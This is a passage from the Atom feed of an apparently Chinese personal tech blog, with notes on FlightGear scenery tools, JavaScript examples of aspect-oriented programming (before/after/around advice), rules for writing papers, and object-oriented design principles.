TerraSync在后台运行（可选择作为单独的进程），监视您的位置，并从“主时间”服务器“及时”下载（或更新）最新的场景。一段时间以来，TerraSync已经集成到核心FlightGear流程中，因此不需要为典型用户处理TerraSync。</p><p>TerraSync的主存储库，即TerraSync从中下载文件的在线资源，每天与FlightGear Scenery数据库同步一次。因此，当使用TerraSync时，您将永远拥有</p><ul><li>最新的.stg文件，告诉FlightGear放置对象的位置</li><li>最新的对象静态模型。 （静态模型定义仅存在于一个地方的唯一对象，例如着名的建筑物或地标。）</li><li>最新的对象共享模型。 （通用模型在不同的地方使用不止一次，每个都可以代表许多不同的对象，如通用房屋或船舶）</li></ul><h3 id="TerrGear"><a href="#TerrGear" class="headerlink" title="TerrGear"></a>TerrGear</h3><p>TerraGear是开源工具和渲染库的集合，可以在地球的3D表示（即3D模型或3D地图）中转换公开可用的GIS数据，以用于实时渲染项目。 TerraGear可以导入3D数据集，例如DEM地形网格，2D多边形数据集（如海岸线，城市轮廓，湖泊轮廓）和2D栅格数据集，例如1 km NAOO土地利用/土地覆盖数据。它还具有基于可用的FAA数据生成逼真的机场，跑道和照明的工具。</p><p>TerraGear是用于为FlightGear项目生成场景的主要工具。</p><p>如果没有terragear，可以更改Terrain纹理，但不能更改地形。如果要更改城市的纹理，请更改材质文件。如果你想改变海岸线，你需要terragear。检查目录FGDATA/Material中的材料文件，你需要terragear。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://zh.wikipedia.org/wiki/FlightGear" target="_blank" rel="noopener">FlightGear</a>,by wikipedia.</li><li><a href="http://wiki.flightgear.org/images/1/1e/New_FG_architecture.pdf" target="_blank" rel="noopener">A NEW ARCHITECTURE FOR FLIGHTGEAR FLIGHT SIMULATOR</a>,by flightgear.</li><li><a href="http://wiki.flightgear.org/FlightGear_high-level_architecture_support" target="_blank" rel="noopener">FlightGear high-level architecture support</a>,by flightgear</li><li><a href="http://wiki.flightgear.org/Developing_with_HLA" target="_blank" rel="noopener">Developing with HLA</a>,by flightgear.</li><li><a href="http://wiki.flightgear.org/High-Level_Architecture" target="_blank" rel="noopener">High-Level Architecture</a>,by flightgear.</li><li><a href="https://en.wikipedia.org/wiki/High-level_architecture" target="_blank" rel="noopener"><br>High-level architecture</a>,by wikipedia.</li><li><a href="http://wiki.flightgear.org/FlightGear_related_projects" target="_blank" rel="noopener">FlightGear related projects</a>,by wikipedia.</li><li><a href="https://sourceforge.net/p/openrti/wiki/Home/" target="_blank" rel="noopener">OpenRTI</a>,by openrti.</li><li><a href="https://en.wikipedia.org/wiki/JSBSim" target="_blank" rel="noopener">JSBSim</a>,by wikipedia.</li><li><a href="http://wiki.flightgear.org/YASim" target="_blank" rel="noopener">YASim</a>,by flightgear.</li><li><a href="http://wiki.flightgear.org/JSBSim_vs_YASim" target="_blank" rel="noopener">JSBSim vs YASim</a>,by flightgear.</li><li><a href="http://atlas.sourceforge.net/" target="_blank" rel="noopener">Atlas</a>,by atlas.</li><li><a href="http://wiki.flightgear.org/FGCom_3.0" target="_blank" rel="noopener">FGCom 3.0</a>,by wikipedia.</li><li><a href="http://wiki.flightgear.org/FlightGear_Multiplayer_Server" target="_blank" rel="noopener">FlightGear Multiplayer Server</a>,by flightgear.</li><li><a href="http://wiki.flightgear.org/SimGear" target="_blank" rel="noopener">SimGear</a>,by flightgear.</li><li><a href="http://wiki.flightgear.org/PLIB" target="_blank" rel="noopener">PLIB</a>,by flightgear.</li><li><a href="http://wiki.flightgear.org/OSG" target="_blank" rel="noopener">OSG</a>,by flightgear.</li><li><a href="https://blog.csdn.net/qq_24848645/article/details/44177635" target="_blank" rel="noopener">Flightgear操作方式以及几种典型飞机的起飞方法</a>,by Mosquito_蚊子.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;FlightGear是一个始于1997年多平台飞行模拟器、开源软件项目&lt;sup&gt;[1]&lt;/sup&gt;。该项目适用的操作系统主要包括Linux、Microsoft Windows和Mac OS X，采用C++编写。&lt;/p&gt;
&lt;h1 id=&quot;FlightGear体系结构&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="3D" scheme="https://huangwang.github.io/tags/3D/"/>
    
      <category term="计算机仿真" scheme="https://huangwang.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BB%BF%E7%9C%9F/"/>
    
  </entry>
  
  <entry>
    <title>面向方面编程简介</title>
    <link href="https://huangwang.github.io/2019/01/23/%E9%9D%A2%E5%90%91%E6%96%B9%E9%9D%A2%E7%BC%96%E7%A8%8B%E7%AE%80%E4%BB%8B/"/>
    <id>https://huangwang.github.io/2019/01/23/面向方面编程简介/</id>
    <published>2019-01-23T04:58:19.000Z</published>
    <updated>2019-01-23T13:34:15.102Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是面向方面编程-What"><a href="#什么是面向方面编程-What" class="headerlink" title="什么是面向方面编程(What)"></a>什么是面向方面编程(What)</h1><p>面向侧面的程序设计（aspect-oriented programming，AOP，又译作面向方面的程序设计、观点导向编程、剖面导向程序设计）是计算机科学中的一个术语，指一种程序设计范型。该范型以一种称为侧面（aspect，又译作方面）的语言构造为基础，侧面是一种新的模块化机制，用来描述分散在对象、类或函数中的横切关注点（crosscutting concern）。</p><p>侧面的概念源于对面向对象的程序设计的改进，但并不只限于此，它还可以用来改进传统的函数。与侧面相关的编程概念还包括元对象协议、主题（subject）、混入（mixin）和委托。</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li>关注点（concern）：对软件工程有意义的小的、可管理的、可描述的软件组成部分，一个关注点通常只同一个特定概念或目标相关联。</li><li>主关注点（core concern）：一个软件最主要的关注点。</li><li>关注点分离（separation of concerns，SOC）：标识、封装和操纵只与特定概念、目标相关联的软件组成部分的能力，即标识、封装和操纵关注点的能力。</li><li>方法（method）：用来描述、设计、实现一个给定关注点的软件构造单位。</li><li>横切（crosscut）：两个关注点相互横切，如果实现它们的方法存在交集。</li><li>支配性分解（dominant decomposition）：将软件分解成模块的主要方式。传统的程序设计语言是以一种线性的文本来描述软件的，只采用一种方式（比如：类）将软件分解成模块；这导致某些关注点比较好的被捕捉，容易进一步组合、扩展；但还有一些关注点没有被捕捉，弥散在整个软件内部。支配性分解一般是按主关注点进行模块分解的。</li><li>横切关注点（crosscutting concerns）：在传统的程序设计语言中，除了主关注点可以被支配性分解方式捕捉以外，还有许多没有被支配性分解方式捕捉到的关注点，这些关注点的实现会弥散在整个软件内部，这时这些关注点同主关注点是横切的。</li><li>侧面（aspect）：在支配性分解的基础上，提供的一种辅助的模块化机制，这种新的模块化机制可以捕捉横切关注点。</li></ul><p>从<strong>主关注点</strong>中分离出横切关注点是面向侧面的程序设计的核心概念。<strong>分离关注点</strong>使得解决特定领域问题的代码从业务逻辑中独立出来，业务逻辑的代码中不再含有针对特定领域问题代码的调用，业务逻辑同特定领域问题的关系通过<strong>侧面</strong>来封装、维护，这样原本分散在在整个应用程序中的变动就可以很好的管理起来。</p><p>对于一个信用卡应用程序来说，存款、取款、帐单管理是它的主关注点，日志和持久化将成为横切整个对象结构的横切关注点。</p><h1 id="为什么需要面向方面编程-Why"><a href="#为什么需要面向方面编程-Why" class="headerlink" title="为什么需要面向方面编程(Why)"></a>为什么需要面向方面编程(Why)</h1><p>AOP技术的优势是显而易见的。在面向对象的世界里，人们提出了各种方法和设计原则来保障系统的可复用性与可扩展性，以期建立一个松散耦合、便于扩展的软件系统。例如GOF提出的“设计模式”，为我们提供了设计的典范与准则。设计模式通过最大程度的利用面向对象的特性，诸如利用继承、多态，对责任进行分离、对依赖进行倒置，面向抽象，面向接口，最终设计出灵活、可扩展、可重用的类库、组件，乃至于整个系统的架构。在设计的过程中，通过各种模式体现对象的行为、暴露的接口、对象间关系、以及对象分别在不同层次中表现出来的形态。然而鉴于对象封装的特殊性，“设计模式”的触角始终在接口与抽象中大做文章，而对于对象内部则无能为力。</p><p>通过“横切”技术，AOP技术就能深入到对象内部翻云覆雨，截取方法之间传递的消息为我所用。由于将核心关注点与横切关注点完全隔离，使得我们能够独立的对“方面”编程。它允许开发者动态地修改静态的OO模型，构造出一个能够不断增长以满足新增需求的系统，就象现实世界中的对象会在其生命周期中不断改变自身，应用程序也可以在发展中拥有新的功能。</p><p>设计软件系统时应用AOP技术，其优势在于：</p><ul><li>在定义应用程序对某种服务（例如日志）的所有需求的时候。通过识别关注点，使得该服务能够被更好的定义，更好的被编写代码，并获得更多的功能。这种方式还能够处理在代码涉及到多个功能的时候所出现的问题，例如改变某一个功能可能会影响到其它的功能，在AOP中把这样的麻烦称之为“纠结（tangling）”。</li><li>利用AOP技术对离散的方面进行的分析将有助于为开发团队指定一位精于该项工作的专家。负责这项工作的最佳人选将可以有效利用自己的相关技能和经验。</li><li>持久性。标准的面向对象的项目开发中，不同的开发人员通常会为某项服务编写相同的代码，例如日志记录。随后他们会在自己的实施中分别对日志进行处理以满足不同单个对象的需求。而通过创建一段单独的代码片段，AOP提供了解决这一问题的持久简单的方案，这一方案强调了未来功能的重用性和易维护性：不需要在整个应用程序中一遍遍重新编写日志代码，AOP使得仅仅编写日志方面（logging aspect）成为可能，并且可以在这之上为整个应用程序提供新的功能。</li></ul><p>总而言之，AOP技术的优势使得需要编写的代码量大大缩减，节省了时间，控制了开发成本。同时也使得开发人员可以集中关注于系统的核心商业逻辑。此外，它更利于创建松散耦合、可复用与可扩展的大型软件系统。</p><h1 id="如何实现面向方面编程-How"><a href="#如何实现面向方面编程-How" class="headerlink" title="如何实现面向方面编程(How)"></a>如何实现面向方面编程(How)</h1><p>使用js实现before（前置通知）、after（后置通知）、around（环绕通知）。</p><h2 id="before（前置通知）"><a href="#before（前置通知）" class="headerlink" title="before（前置通知）"></a>before（前置通知）</h2><p>before函数，用来实现函数的前置通知。在目标函数的前面执行一些前置操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// AOP 前置通知函数声明</span><br><span class="line">/**</span><br><span class="line"> * 给方法加入前置切片函数</span><br><span class="line"> * 可以在执行方法之前执行一些操作,</span><br><span class="line"> * 前置切片的返回值为false时，不影响原方法的执行</span><br><span class="line"> * @param func &#123;Function&#125; 被前置执行的函数</span><br><span class="line"> * @return &#123;Function&#125; 加入前置通知的函数</span><br><span class="line"> */</span><br><span class="line">Function.prototype._before = function(func)&#123;</span><br><span class="line">    var __self = this;</span><br><span class="line">    return function()&#123;</span><br><span class="line">        func.apply(__self, arguments);</span><br><span class="line">        return __self.apply(__self, arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 代码</span><br><span class="line">function a()&#123;</span><br><span class="line">    console.log(&apos;I\&apos;m a&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a = a._before(function()&#123;</span><br><span class="line">    console.log(&apos;before&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">a();</span><br><span class="line">// 结果：</span><br><span class="line">// before</span><br><span class="line">// I&apos;m a</span><br></pre></td></tr></table></figure></p><h2 id="after（后置通知）"><a href="#after（后置通知）" class="headerlink" title="after（后置通知）"></a>after（后置通知）</h2><p>after函数，用来实现函数的后置通知。在目标函数的后面面执行一些后置操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// AOP 后置通知函数声明</span><br><span class="line">/**</span><br><span class="line"> * 给方法加入后置切片函数</span><br><span class="line"> * 可以在执行方法之之后执行一些操作</span><br><span class="line"> * 后置切片的返回值为false时，不影响原方法的执行</span><br><span class="line"> * @param func &#123;Function&#125; 被后置执行的函数</span><br><span class="line"> * @return &#123;Function&#125; 加入后置通知的函数</span><br><span class="line"> * @constructor</span><br><span class="line"> */</span><br><span class="line">Function.prototype._after = function(func)&#123;</span><br><span class="line">    var __self = this;</span><br><span class="line">    return function()&#123;</span><br><span class="line">        var ret = __self.apply(__self, arguments);</span><br><span class="line">        func.apply(__self, arguments);</span><br><span class="line">        return ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 代码</span><br><span class="line">function b()&#123;</span><br><span class="line">    console.log(&apos;I\&apos;m b&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">b = b._after(function()&#123;</span><br><span class="line">    console.log(&apos;after&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">b();</span><br><span class="line">// 结果：</span><br><span class="line">// I&apos;m b</span><br><span class="line">// after</span><br></pre></td></tr></table></figure><h2 id="around（环绕通知）"><a href="#around（环绕通知）" class="headerlink" title="around（环绕通知）"></a>around（环绕通知）</h2><p>在around函数中，引入了一个JoinPoint对象。JoinPoint对象封装了目标函数和目标函数的参数。在调用JoinPoint对象的invoke函数时，会去调用原来的目标函数。在调用invoke时，如果需要改变目标函数的this对象，需要将对象传入到invoke的参数中。around函数，可以在目标函数的前面和后面随意加入逻辑代码，也可以根据条件判断是否执行目标函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">// AOP 环绕通知函数声明</span><br><span class="line">/**</span><br><span class="line"> * 切入点对象</span><br><span class="line"> * 不允许切入对象多次调用</span><br><span class="line"> * @param obj   对象</span><br><span class="line"> * @param args  参数</span><br><span class="line"> * @constructor</span><br><span class="line"> */</span><br><span class="line">function JoinPoint(obj, args)&#123;</span><br><span class="line">    var isapply = false;                       // 判断是否执行过目标函数</span><br><span class="line">    var result = null;                         // 保存目标函数的执行结果</span><br><span class="line"></span><br><span class="line">    this.source = obj;                         // 目标函数对象</span><br><span class="line">    this.args = args;                          // 目标函数对象传入的参数</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 目标函数的代理执行函数</span><br><span class="line">     * 如果被调用过，不能重复调用</span><br><span class="line">     * @return &#123;object&#125; 目标函数的返回结果</span><br><span class="line">     */</span><br><span class="line">    this.invoke = function(thiz)&#123;              </span><br><span class="line">        if(isapply)&#123; return; &#125;</span><br><span class="line">        isapply = true;</span><br><span class="line">        result = this.source.apply(thiz || this.source, this.args);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // 获取目标函数执行结果</span><br><span class="line">    this.getResult = function()&#123;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 方法环绕通知</span><br><span class="line"> * 原方法的执行需在环绕通知方法中执行</span><br><span class="line"> * @param func &#123;Function&#125; 环绕通知的函数</span><br><span class="line"> *     程序会往func中传入一个JoinPoint(切入点)对象, 在适当的时机</span><br><span class="line"> *     执行JoinPoint对象的invoke函数，调用目标函数</span><br><span class="line"> * </span><br><span class="line"> * @return &#123;Function&#125; 切入环绕通知后的函数，</span><br><span class="line"> */</span><br><span class="line">Function.prototype._around = function(func)&#123;</span><br><span class="line">    var __self = this;</span><br><span class="line">    return function()&#123;</span><br><span class="line">        var args = [new JoinPoint(__self, arguments)];</span><br><span class="line">        return func.apply(this, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 代码</span><br><span class="line"></span><br><span class="line">var isAdmin = true;</span><br><span class="line"></span><br><span class="line">function c()&#123;</span><br><span class="line">    console.log(&apos;show user list&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c = c._around(function(joinpoint)&#123;</span><br><span class="line">    if(isAdmin)&#123;    // 满足条件时，执行目标函数</span><br><span class="line">        console.log(&apos;is admin&apos;);</span><br><span class="line">        joinpoint.invoke(this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">c();</span><br><span class="line">// 结果</span><br><span class="line">// if isAdmin == true</span><br><span class="line">//     is admin</span><br><span class="line">//     show user list</span><br><span class="line">// if isAdmin == false</span><br></pre></td></tr></table></figure></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://zh.wikipedia.org/wiki/面向侧面的程序设计" target="_blank" rel="noopener">面向侧面的程序设计</a>,by wikipedia.</li><li><a href="https://www.zhihu.com/question/24863332" target="_blank" rel="noopener">什么是面向切面编程AOP？</a>,by 知乎.</li><li><a href="https://blog.csdn.net/liuweitoo/article/details/8166503" target="_blank" rel="noopener">什么是面向方面编程</a>,by liuweitoo.</li><li><a href="https://blog.csdn.net/hguisu/article/details/7586704" target="_blank" rel="noopener">AOP面向方面编程</a>,by 规速.</li><li><a href="https://www.jianshu.com/p/a833d114099a" target="_blank" rel="noopener">团队开发框架实战—面向切面的编程 AOP</a>,by Bobby0322.</li><li><a href="https://blog.csdn.net/yanquan345/article/details/19760027" target="_blank" rel="noopener">轻松理解AOP(面向切面编程)</a>,by -望远-.</li><li><a href="https://blog.csdn.net/qq_21460229/article/details/79696159" target="_blank" rel="noopener">AOP在JS中的实现及应用</a>,by _Sirius.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;什么是面向方面编程-What&quot;&gt;&lt;a href=&quot;#什么是面向方面编程-What&quot; class=&quot;headerlink&quot; title=&quot;什么是面向方面编程(What)&quot;&gt;&lt;/a&gt;什么是面向方面编程(What)&lt;/h1&gt;&lt;p&gt;面向侧面的程序设计（aspect-ori
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="软件工程" scheme="https://huangwang.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>如何写好一篇论文的十条基本原则</title>
    <link href="https://huangwang.github.io/2019/01/17/%E5%A6%82%E4%BD%95%E5%86%99%E5%A5%BD%E4%B8%80%E7%AF%87%E8%AE%BA%E6%96%87%E7%9A%84%E5%8D%81%E6%9D%A1%E5%9F%BA%E6%9C%AC%E5%8E%9F%E5%88%99/"/>
    <id>https://huangwang.github.io/2019/01/17/如何写好一篇论文的十条基本原则/</id>
    <published>2019-01-17T14:20:52.000Z</published>
    <updated>2019-01-17T15:05:40.506Z</updated>
    
    <content type="html"><![CDATA[<p>看到一篇有关如何撰写科技论文的好文章，赶紧摘抄一下。</p><h1 id="原则（规则-1–4）"><a href="#原则（规则-1–4）" class="headerlink" title="原则（规则 1–4）"></a>原则（规则 1–4）</h1><p>写作即交流。因此，读者体验是首等重要的，所有的写作服务于这一目标。当你写作时，心中要时时有读者。以下四条规则是关于如何赢取读者。</p><h2 id="规则-1：论文有一个中心主旨，并体现在标题中"><a href="#规则-1：论文有一个中心主旨，并体现在标题中" class="headerlink" title="规则 1：论文有一个中心主旨，并体现在标题中"></a>规则 1：论文有一个中心主旨，并体现在标题中</h2><h2 id="规则-2：假设写作对象对论文内容一无所知"><a href="#规则-2：假设写作对象对论文内容一无所知" class="headerlink" title="规则 2：假设写作对象对论文内容一无所知"></a>规则 2：假设写作对象对论文内容一无所知</h2><h2 id="规则-3：坚持原因、内容和结论（Context-Content-Conclusion／C-C-C）结构"><a href="#规则-3：坚持原因、内容和结论（Context-Content-Conclusion／C-C-C）结构" class="headerlink" title="规则 3：坚持原因、内容和结论（Context-Content-Conclusion／C-C-C）结构"></a>规则 3：坚持原因、内容和结论（Context-Content-Conclusion／C-C-C）结构</h2><h2 id="规则-4：避免委婉，使用并行优化的逻辑流"><a href="#规则-4：避免委婉，使用并行优化的逻辑流" class="headerlink" title="规则 4：避免委婉，使用并行优化的逻辑流"></a>规则 4：避免委婉，使用并行优化的逻辑流</h2><h1 id="论文组成（规则-5-8）"><a href="#论文组成（规则-5-8）" class="headerlink" title="论文组成（规则 5-8）"></a>论文组成（规则 5-8）</h1><p>论文的摘要、介绍、结果与讨论都适用于 C-C-C 结构，但各有些许不同。在下图中，我们将讨论这些专门结构的问题：</p><p align="center">    <img src="images/paper_structure.jpg" width="90%" alt="论文结构"></p><h2 id="规则-5：在摘要中总结所有要点"><a href="#规则-5：在摘要中总结所有要点" class="headerlink" title="规则 5：在摘要中总结所有要点"></a>规则 5：在摘要中总结所有要点</h2><h2 id="规则-6：在介绍中讨论这篇论文的重要性"><a href="#规则-6：在介绍中讨论这篇论文的重要性" class="headerlink" title="规则 6：在介绍中讨论这篇论文的重要性"></a>规则 6：在介绍中讨论这篇论文的重要性</h2><h2 id="规则-7：用多个逻辑相关的陈述句（可辅以图表）给出支持论文中心思想的结果"><a href="#规则-7：用多个逻辑相关的陈述句（可辅以图表）给出支持论文中心思想的结果" class="headerlink" title="规则 7：用多个逻辑相关的陈述句（可辅以图表）给出支持论文中心思想的结果"></a>规则 7：用多个逻辑相关的陈述句（可辅以图表）给出支持论文中心思想的结果</h2><h2 id="规则-8：讨论如何填补差距、论文的局限性和论文与该领域的相关性"><a href="#规则-8：讨论如何填补差距、论文的局限性和论文与该领域的相关性" class="headerlink" title="规则 8：讨论如何填补差距、论文的局限性和论文与该领域的相关性"></a>规则 8：讨论如何填补差距、论文的局限性和论文与该领域的相关性</h2><h1 id="写作流程（规则-9-和-10）"><a href="#写作流程（规则-9-和-10）" class="headerlink" title="写作流程（规则 9 和 10）"></a>写作流程（规则 9 和 10）</h1><h2 id="规则-9：把时间花费到关键的地方：题目、摘要、图和大纲"><a href="#规则-9：把时间花费到关键的地方：题目、摘要、图和大纲" class="headerlink" title="规则 9：把时间花费到关键的地方：题目、摘要、图和大纲"></a>规则 9：把时间花费到关键的地方：题目、摘要、图和大纲</h2><h2 id="规则-10：获取反馈，然后简化、重新使用、再次构造这个故事"><a href="#规则-10：获取反馈，然后简化、重新使用、再次构造这个故事" class="headerlink" title="规则 10：获取反馈，然后简化、重新使用、再次构造这个故事"></a>规则 10：获取反馈，然后简化、重新使用、再次构造这个故事</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://zhuanlan.zhihu.com/p/30575091" target="_blank" rel="noopener">从标题到写作流程：写好一篇论文的十条基本原则</a>,by 机器之心.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;看到一篇有关如何撰写科技论文的好文章，赶紧摘抄一下。&lt;/p&gt;
&lt;h1 id=&quot;原则（规则-1–4）&quot;&gt;&lt;a href=&quot;#原则（规则-1–4）&quot; class=&quot;headerlink&quot; title=&quot;原则（规则 1–4）&quot;&gt;&lt;/a&gt;原则（规则 1–4）&lt;/h1&gt;&lt;p&gt;写作即交
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="科研" scheme="https://huangwang.github.io/tags/%E7%A7%91%E7%A0%94/"/>
    
  </entry>
  
  <entry>
    <title>面向对象编程的设计原则</title>
    <link href="https://huangwang.github.io/2019/01/17/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/"/>
    <id>https://huangwang.github.io/2019/01/17/面向对象编程的设计原则/</id>
    <published>2019-01-17T13:56:12.000Z</published>
    <updated>2019-01-23T04:54:30.179Z</updated>
    
    <content type="html"><![CDATA[<p>说来惭愧，我虽然计算机科学专业科班出生，但是对面向对象编程的理解并不透彻。但在看到“如何写一手漂亮的模型：面向对象编程的设计原则综述”后，感觉收获不少，欣喜之余感觉摘抄记录一下。</p><h1 id="面向对象编程的设计原则"><a href="#面向对象编程的设计原则" class="headerlink" title="面向对象编程的设计原则"></a>面向对象编程的设计原则</h1><p>为了写出清晰的、高质量的、可维护并且可扩展的代码，面向对象编程（OOP）将是我们最佳的选择。</p><h2 id="对象类型"><a href="#对象类型" class="headerlink" title="对象类型"></a>对象类型</h2><p>因为我们要围绕对象来建立代码，所以区分它们的不同责任和变化是有用的。一般来说，面向对象的编程有三种类型的对象。</p><h3 id="实体对象"><a href="#实体对象" class="headerlink" title="实体对象"></a>实体对象</h3><p>这类对象通常对应着问题空间中的一些现实实体。比如我们要建立一个角色扮演游戏（RPG），那么简单的 Hero 类就是一个实体对象。</p><p>这类对象通常包含关于它们自身的属性（例如 health 或 mana），这些属性根据具体的规则都是可修改的。</p><h3 id="控制对象（Control-Object）"><a href="#控制对象（Control-Object）" class="headerlink" title="控制对象（Control Object）"></a>控制对象（Control Object）</h3><p>控制对象（有时候也称作管理对象）主要负责与其它对象的协调，这是一些管理并调用其它对象的对象。我们上面的 RPG 案例中有一个很棒的例子，Fight 类控制两个英雄，并让它们对战。</p><p>在这种类中，为对战封装编程逻辑可以给我们提供多个好处：其中之一就是动作的可扩展性。我们可以很容易地将参与战斗的英雄传递给非玩家角色（NPC），这样它们就能利用相同的 API。我们还可以很容易地继承这个类，并复写一些功能来满足新的需要。</p><h3 id="边界对象（Boundary-Object）"><a href="#边界对象（Boundary-Object）" class="headerlink" title="边界对象（Boundary Object）"></a>边界对象（Boundary Object）</h3><p>这些是处在系统边缘的对象。任何一个从其它系统获取输入或者给其它系统产生输出的对象都可以被归类为边界对象，无论那个系统是用户，互联网或者是数据库。</p><p>这些边界对象负责向系统内部或者外部传递信息。例如对要接收的用户指令，我们需要一个边界对象来将键盘输入（比如一个空格键）转换为一个可识别的域事件（例如角色的跳跃）。</p><h3 id="Bonus：值对象（Value-Object）"><a href="#Bonus：值对象（Value-Object）" class="headerlink" title="Bonus：值对象（Value Object）"></a>Bonus：值对象（Value Object）</h3><p>价值对象代表的是域（domain）中的一个简单值。它们无法改变，不恒一。</p><p>如果将它们结合在我们的游戏中，Money 类或者 Damage 类就表示这种对象。上述的对象让我们容易地区分、寻找和调试相关功能，然而仅使用基础的整形数组或者整数却无法实现这些功能。</p><p><strong>它们可以归类为实体对象的子类别</strong>。</p><h2 id="关键设计原则"><a href="#关键设计原则" class="headerlink" title="关键设计原则"></a>关键设计原则</h2><p>设计原则是软件设计中的规则，过去这些年里已经证明它们是有价值的。严格地遵循这些原则有助于软件达到一流的质量。</p><h3 id="抽象（Abstraction）"><a href="#抽象（Abstraction）" class="headerlink" title="抽象（Abstraction）"></a>抽象（Abstraction）</h3><p>抽象就是将一个概念在一定的语境中简化为原始本质的一种思想。它允许我们拆解一个概念来更好的理解它。</p><p>上面的游戏案例阐述了抽象，让我们来看一下 Fight 类是如何构建的。我们以尽可能简单的方式使用它，即在实例化的过程中给它两个英雄作为参数，然后调用 fight() 方法。不多也不少，就这些。</p><h3 id="封装"><a href="#封装" class="headerlink" 